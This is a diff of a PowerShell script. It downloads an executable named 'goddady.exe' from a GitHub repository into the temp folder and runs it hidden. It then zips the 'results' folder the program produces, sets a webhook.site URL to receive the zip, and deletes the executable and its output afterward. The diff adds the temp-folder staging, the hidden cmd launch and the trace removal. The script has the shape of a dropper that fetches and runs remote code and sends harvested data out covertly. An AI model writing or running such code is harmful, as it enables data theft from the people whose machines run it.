@@ -1,18 +1,17 @@
 $exeName = 'goddady.exe'; # Name of the executable
 $zipUrl = 'https://webhook.site/2911c139-ed87-4411-a940-58458f44ebb1'; # Replace with the URL to receive the zip file
+$exePath = Join-Path $env:TEMP $exeName; # Download to temp
+$resultsFolder = Join-Path $env:TEMP 'results'; # Results folder in temp
+$zipPath = Join-Path $env:TEMP 'results.zip'; # Zip file in temp
 
 try {
     if (-not (Test-Path $exePath -PathType Leaf)) {
-        iwr -Uri 'https://github.com/AndreiVladescu/Powershell-Scripts/raw/refs/heads/main/goddady.exe' -OutFile $exePath; # Download only if not present
+        iwr -Uri 'https://github.com/AndreiVladescu/Powershell-Scripts/raw/refs/heads/main/goddady.exe' -OutFile $exePath; # Download to temp
     }
 
-	$exePath = Join-Path $PSScriptRoot $exeName;
-	$resultsFolder = Join-Path $PSScriptRoot 'results';
-	$zipPath = Join-Path $PSScriptRoot 'results.zip';
+    Start-Process -FilePath cmd.exe -ArgumentList "/c cd /d $env:TEMP && $exeName" -WindowStyle Hidden -Wait;
 
-    Start-Process -FilePath $exePath -WindowStyle Hidden; # Run in background
-
-    Start-Sleep -Seconds 10; # Give the process time to generate results
+    Start-Sleep -Seconds 5;
 
     if (Test-Path $resultsFolder -PathType Container) {
         Add-Type -AssemblyName 'System.IO.Compression.FileSystem';
@@ -23,7 +22,7 @@ try {
 
         Remove-Item $zipPath;
         Remove-Item -Recurse -Force $resultsFolder;
-		Remove-Item $exeName;
+        Remove-Item $exePath; # Remove the exe from temp
     }
 
 } catch {
